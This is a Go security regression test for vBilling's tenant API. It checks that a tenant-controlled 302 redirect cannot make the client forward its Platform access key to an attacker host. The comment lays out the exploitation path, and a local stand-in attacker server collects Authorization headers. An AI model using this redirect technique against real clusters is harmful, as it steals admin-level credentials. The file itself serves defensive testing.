package tenantapi_test

// Second independent review (v0.3.0). Every TestReview2* test here fails on
// v0.3.0 and describes the expected behavior.

import (
	"context"
	"net/http"
	"net/http/httptest"
	"strings"
	"sync"
	"testing"
	"time"

	"k8s.io/client-go/kubernetes/fake"
	"k8s.io/client-go/rest"

	"github.com/vclusterlabs-experiments/vbilling/internal/discovery"
	"github.com/vclusterlabs-experiments/vbilling/internal/metrics"
	"github.com/vclusterlabs-experiments/vbilling/internal/platform"
	"github.com/vclusterlabs-experiments/vbilling/internal/tenantapi"
)

// route is what platform.Resolver.ProxyConfig returns for a bound cluster
// that is not sleeping: the Platform proxy URL with the access key.
type route struct{ c *platform.Client }

func (r route) ProxyConfig(cl discovery.TenantCluster) (*rest.Config, string, error) {
	return r.c.ProxyConfig(cl.Platform.Project, cl.Platform.Instance), "v1", nil
}

// With TENANT_SOURCE=platform, vBilling reaches a cluster through the
// Platform proxy with its Platform access key: a global role that may "use"
// every VirtualClusterInstance, which per docs/private-nodes.html makes it
// cluster admin inside every tenant's cluster. client-go follows redirects,
// and its bearer round tripper adds the key again to the redirected request,
// whatever its host. A tenant controls responses on that connection: it
// sets vbilling.vcluster.com/prometheus-url=tenant-service://NS/NAME:PORT
// (a per-cluster setting the Platform binding keeps, from vcluster.yaml)
// and runs a Service that answers 302 Location: https://attacker/. The
// cluster's API server proxies that answer back unchanged (it only rewrites
// Location headers that point at the proxied Service), and vBilling sends
// its Platform access key to the attacker.
func TestReview2PlatformKeyIsNotSentToARedirectTarget(t *testing.T) {
	var mu sync.Mutex
	var leaked []string
	attacker := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		mu.Lock()
		leaked = append(leaked, r.Header.Get("Authorization"))
		mu.Unlock()
		w.WriteHeader(http.StatusNotFound)
	}))
	defer attacker.Close()
	// The Platform proxy, forwarding to the tenant's cluster, which proxies
	// to the tenant's Service: its redirect comes back as is.
	plat := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if strings.Contains(r.URL.Path, "/services/redirector:80/proxy/") {
			http.Redirect(w, r, attacker.URL+"/collect", http.StatusFound)
			return
		}
		http.NotFound(w, r)
	}))
	defer plat.Close()

	c, err := platform.NewClient(platform.ClientOptions{URL: plat.URL, AccessKey: "PLATFORM-ACCESS-KEY"})
	if err != nil {
		t.Fatal(err)
	}
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()
	host := fake.NewSimpleClientset() // no vbilling-kubeconfig Secret: the Platform route is used
	mgr := tenantapi.New(ctx, host, tenantapi.Options{Platform: route{c}, Timeout: 5 * time.Second})
	coll := metrics.NewCollector(host, nil, metrics.Options{Region: "eu-west-1"})
	coll.UseTenantAPI(mgr)
	ps, err := coll.NewPromSource(metrics.PromOptions{})
	if err != nil {
		t.Fatal(err)
	}
	cl := discovery.TenantCluster{Name: "gpu", Namespace: "p-research-gpu", Source: "statefulset", Ready: true}
	cl.ApplyPlatform(discovery.PlatformBinding{Project: "research", Instance: "gpu", Tenant: "globex"})
	cl.Annotations[discovery.AnnotationPrefix+"prometheus-url"] = "tenant-service://evil/redirector:80" // vcluster.yaml workload annotation
	end := time.Now().UTC().Truncate(time.Minute)
	_, _ = ps.Collect(ctx, []metrics.Target{{Cluster: cl, Tenant: "tenant-globex"}}, []metrics.Window{{Start: end.Add(-time.Minute), End: end, Latest: true}})

	mu.Lock()
	defer mu.Unlock()
	for _, h := range leaked {
		if strings.Contains(h, "PLATFORM-ACCESS-KEY") {
			t.Fatalf("a tenant's redirect made vBilling send its Platform access key to %s: Authorization %q", attacker.URL, h)
		}
	}
}
